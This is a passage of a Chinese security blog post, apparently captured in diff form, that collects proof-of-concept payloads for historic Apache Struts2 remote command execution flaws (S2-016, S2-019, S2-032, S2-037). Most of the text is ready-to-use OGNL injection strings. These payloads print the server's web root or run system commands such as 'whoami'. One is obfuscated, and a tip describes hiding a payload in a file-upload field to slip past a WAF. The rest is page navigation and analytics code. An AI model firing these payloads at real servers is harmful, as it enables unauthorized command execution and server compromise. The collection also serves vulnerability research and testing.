+<h4 id="执行系统命令-4"><a href="#执行系统命令-4" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos;</div></pre></td></tr></table></figure>
+<p>还有一种比较隐蔽的方法，将PoC放在文件上传的name处，过waf。</p>
+<h2 id="Struts2-S2-019"><a href="#Struts2-S2-019" class="headerlink" title="Struts2 S2-019"></a>Struts2 S2-019</h2><pre><code>影响版本: 2.0.0 - 2.3.15.1
+漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-019
+</code></pre><p>该漏洞成因为开启了开发者模式，传入<code>debug=command&amp;expression=</code>导致执行OGNL表达式，从而造成命令执行漏洞。</p>
+<h3 id="构造PoC-6"><a href="#构造PoC-6" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根路径-1"><a href="#获取web根路径-1" class="headerlink" title="获取web根路径"></a>获取web根路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29</div></pre></td></tr></table></figure>
+<h4 id="执行系统命令-5"><a href="#执行系统命令-5" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-032"><a href="#Struts2-S2-032" class="headerlink" title="Struts2 S2-032"></a>Struts2 S2-032</h2><pre><code>影响版本: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3)
+漏洞详情: https://struts.apache.org/docs/s2-032.html
+</code></pre><blockquote>
+<p>在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》</name></p>
+</blockquote>
+<p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="external">rickgray</a>的描述。</p>
+<h3 id="构造PoC-7"><a href="#构造PoC-7" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-5"><a href="#获取web根目录-5" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</div></pre></td></tr></table></figure>
+<h4 id="执行系统命令-6"><a href="#执行系统命令-6" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-037"><a href="#Struts2-S2-037" class="headerlink" title="Struts2 S2-037"></a>Struts2 S2-037</h2><pre><code>影响版本: 2.3.20 - 2.3.28.1
+漏洞详情: http://struts.apache.org/docs/s2-037.html
+</code></pre><blockquote>
+<p>这个漏洞和之前S2-032/033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。</p>
+</blockquote>
+<p>上文引用<a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438" target="_blank" rel="external">nsfocus</a>%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)的描述</p>
+<h3 id="构造PoC-8"><a href="#构造PoC-8" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-6"><a href="#获取web根目录-6" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</div></pre></td></tr></table></figure>
+<h4 id="执行系统命令-7"><a href="#执行系统命令-7" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</div></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Struts2命令执行算是一个比较经典的漏洞了，希望以后深入java的一些框架，可以从底层来分析：）</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Struts2命令执行集合"><span class="toc-number">2.</span> <span class="toc-text">Struts2命令执行集合</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-001"><span class="toc-number">2.1.</span> <span class="toc-text">Struts2 S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC"><span class="toc-number">2.1.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取tomcat执行路径"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">获取tomcat执行路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-005"><span class="toc-number">2.2.</span> <span class="toc-text">Struts2 S2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-1"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-1"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-009"><span class="toc-number">2.3.</span> <span class="toc-text">Struts2 S2-009</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#弹计算器"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">弹计算器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-2"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">获取web根目录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-012"><span class="toc-number">2.4.</span> <span class="toc-text">Struts2 S2-012</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根路径"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">获取web根路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-2"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-013-S2-014"><span class="toc-number">2.5.</span> <span class="toc-text">Struts2 S2-013/S2-014</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-4"><span class="toc-number">2.5.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-3"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-3"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-016"><span class="toc-number">2.6.</span> <span class="toc-text">Struts2 S2-016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-5"><span class="toc-number">2.6.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-4"><span class="toc-number">2.6.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-4"><span class="toc-number">2.6.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-019"><span class="toc-number">2.7.</span> <span class="toc-text">Struts2 S2-019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-6"><span class="toc-number">2.7.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根路径-1"><span class="toc-number">2.7.1.1.</span> <span class="toc-text">获取web根路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-5"><span class="toc-number">2.7.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-032"><span class="toc-number">2.8.</span> <span class="toc-text">Struts2 S2-032</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-7"><span class="toc-number">2.8.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-5"><span class="toc-number">2.8.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-6"><span class="toc-number">2.8.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-037"><span class="toc-number">2.9.</span> <span class="toc-text">Struts2 S2-037</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-8"><span class="toc-number">2.9.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-6"><span class="toc-number">2.9.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-7"><span class="toc-number">2.9.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&text=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&is_video=false&description=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【VULNERABLITY】Struts2命令执行各版本记录&body=Check out this article: http://blog.0kami.cn/2017/01/13/Struts2-history-payload/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&name=【VULNERABLITY】Struts2命令执行各版本记录&description=&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 0kami
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = '0kami';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
